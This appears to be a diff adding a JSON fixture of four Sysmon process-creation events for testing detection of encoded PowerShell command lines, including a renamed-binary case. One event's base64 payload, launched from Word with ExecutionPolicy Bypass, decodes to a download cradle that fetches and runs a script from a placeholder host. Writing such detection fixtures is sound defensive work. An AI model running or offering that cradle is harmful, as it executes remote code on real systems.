@@ -1,0 +1,42 @@
+[
+  {
+    "_comment": "Classic short flag: powershell.exe -enc <base64>. Decodes to: Write-Output 'ringtail test'",
+    "EventID": 1,
+    "Computer": "WKSTN-EXAMPLE-01.example.local",
+    "User": "EXAMPLE\\jdoe",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "OriginalFileName": "PowerShell.EXE",
+    "CommandLine": "powershell.exe -NoP -W Hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHIAaQBuAGcAdABhAGkAbAAgAHQAZQBzAHQAJwA=",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "_comment": "Full flag name in caps, launched from Word. Sigma matching is case-insensitive. Decodes to a download cradle aimed at example.invalid.",
+    "EventID": 1,
+    "Computer": "WKSTN-EXAMPLE-02.example.local",
+    "User": "EXAMPLE\\asmith",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "OriginalFileName": "PowerShell.EXE",
+    "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwBhAC4AcABzADEAIgApAA==",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+  },
+  {
+    "_comment": "PowerShell 7 with the -ec alias.",
+    "EventID": 1,
+    "Computer": "SRV-EXAMPLE-01.example.local",
+    "User": "EXAMPLE\\svc-placeholder",
+    "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+    "OriginalFileName": "pwsh.dll",
+    "CommandLine": "pwsh.exe -nop -ec VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHIAaQBuAGcAdABhAGkAbAAgAHQAZQBzAHQAJwA=",
+    "ParentImage": "C:\\Windows\\System32\\services.exe"
+  },
+  {
+    "_comment": "Renamed binary: Image is not powershell.exe, but OriginalFileName (from the PE header) still is.",
+    "EventID": 1,
+    "Computer": "WKSTN-EXAMPLE-03.example.local",
+    "User": "EXAMPLE\\jdoe",
+    "Image": "C:\\Users\\Public\\updater.exe",
+    "OriginalFileName": "PowerShell.EXE",
+    "CommandLine": "updater.exe -w hidden -e VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHIAaQBuAGcAdABhAGkAbAAgAHQAZQBzAHQAJwA=",
+    "ParentImage": "C:\\Windows\\explorer.exe"
+  }
+]
